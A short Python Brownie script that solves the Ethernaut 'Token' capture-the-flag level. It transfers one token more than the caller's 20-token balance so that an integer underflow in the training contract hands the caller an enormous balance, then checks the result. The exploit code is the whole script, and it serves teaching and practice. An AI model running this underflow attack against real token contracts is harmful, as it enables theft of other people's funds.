from scripts.helper.context import *
from scripts.helper.account import _from, acc
from brownie import Token

##########################################
# The goal of this level is for you to hack the basic token contract below.

# You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
##########################################


# solve the challenge
def solve_challenge():
    # load challenge
    token = load_challenge(ContractObject=Token, instance_key='token')

    # transfer lots of tokens to the contract deployer
    # who owns most of the token supply 
    token.transfer(EthernautContractAddresses['token'], 21, _from)

    # check the balance of the deployer after having sent *one* more token
    # than the balance i originally had
    print(token.balanceOf(EthernautContractAddresses['token']))

    # check my balance, which should be a huge amount since we cause integer overflow
    print(token.balanceOf(acc.address))

    # check my balance is higher than 20
    amount_assertion = token.balanceOf(acc.address) > 20
    print(f'Does address {acc.address} have more than 20 tokens?: {amount_assertion}')

    return amount_assertion
    
def main():
    solve_challenge()
